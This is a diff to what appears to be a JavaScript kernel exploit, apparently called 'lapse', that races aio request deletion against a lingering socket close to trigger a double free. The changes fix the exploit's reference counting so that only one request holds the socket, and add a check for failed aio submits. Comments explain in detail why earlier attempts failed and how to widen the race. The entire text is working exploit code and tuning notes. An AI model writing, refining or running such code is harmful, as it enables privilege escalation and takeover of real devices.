@@ -137,16 +137,29 @@ const ST = {
     server_sock: -1, server_addr: 0n,
 };
 
-/* reqs1 is the array aio_submit_cmd copies in. Only nbyte and fd matter to the
- * race: fd is the socket whose close() has to sleep, and nbyte must be non-zero
- * for that fd so the request actually references it. */
+/* reqs1 is the array aio_submit_cmd copies in.
+ *
+ * The default fd is -1 and that matters: EXACTLY ONE request may reference the
+ * client socket. Setting fd on all three (which the first version did) gives
+ * the socket three references, so the racer's aio_multi_delete of a single
+ * request drops one and leaves two — the file never reaches refcount 0,
+ * soclose() is never called, and the connection stays ESTABLISHED. That is
+ * precisely what 128/128 attempts reported: poll=0x10004 tcp_state=4, with no
+ * variance at all, which is the signature of a structural bug rather than a
+ * lost race. The caller sets reqs1[which].fd per attempt instead. */
 function build_reqs1(count, fd) {
+    if (fd === undefined) fd = -1;
     bzero(ST.reqs1, SIZEOF_AIO_RW_REQUEST * AIO_MAX_NUM);
     for (let i = 0; i < count; i++) {
         const o = i * SIZEOF_AIO_RW_REQUEST;
         wr64(ST.reqs1, o + 0x08, fd === -1 ? 0n : 1n);   // nbyte
         wr32(ST.reqs1, o + 0x20, fd >>> 0);              // fd
     }
+}
+
+// Point one request at a socket, leaving the others at fd -1.
+function set_req_fd(idx, fd) {
+    wr32(ST.reqs1, idx * SIZEOF_AIO_RW_REQUEST + 0x20, fd >>> 0);
 }
 
 function spray_aio(cmd, num_reqs, idsAddr, count) {
@@ -317,6 +330,11 @@ function double_free_reqs2() {
     const info = alloc(TCP_INFO_SIZE);
     const infoLen = alloc(4);
 
+    /* Build the request template ONCE, with every fd at -1. Only reqs1[which]
+     * is re-pointed at each attempt's socket; the other two must stay at -1 so
+     * the socket has exactly one reference for the racer's delete to drop. */
+    build_reqs1(NUM_REQS, -1);
+
     // Park the racer ONCE, before the loop — see spawnDeleteRacer.
     spawnDeleteRacer(idsWhich, outs1);
 
@@ -331,9 +349,23 @@ function double_free_reqs2() {
         // make soclose() sleep — this is what turns a tight race into a wide one
         sc("setsockopt", S(client), S(SOL_SOCKET), S(SO_LINGER), BigInt(linger), S(8));
 
-        build_reqs1(NUM_REQS, client);
+        // ONE request references the socket — see build_reqs1.
+        set_req_fd(which, client);
         bzero(idsAddr, NUM_REQS * 4);
         spray_aio(AIO_CMD_READ | AIO_CMD_MULTI, NUM_REQS, idsAddr, NUM_REQS);
+
+        /* Check the submit actually produced ids. aio_submit_cmd's return was
+         * being discarded, and a failed submit is indistinguishable downstream
+         * from a lost race: no request would hold the socket, close() would
+         * drop it immediately, and every attempt would look wrong for a reason
+         * nothing in the log names. */
+        const id0 = rd32(idsAddr, which * 4);
+        if (id0 === 0) {
+            sc("close", S(client)); sc("close", S(conn));
+            throw new Error("lapse: aio_submit_cmd produced no id for req "
+                            + which + " — nothing holds the socket");
+        }
+
         process_aio(AIO_OP_CANCEL | AIO_OP_POLL, idsAddr, 0, NUM_REQS);
 
         // drop our reference so the racer's delete is the one that _fdrop()s
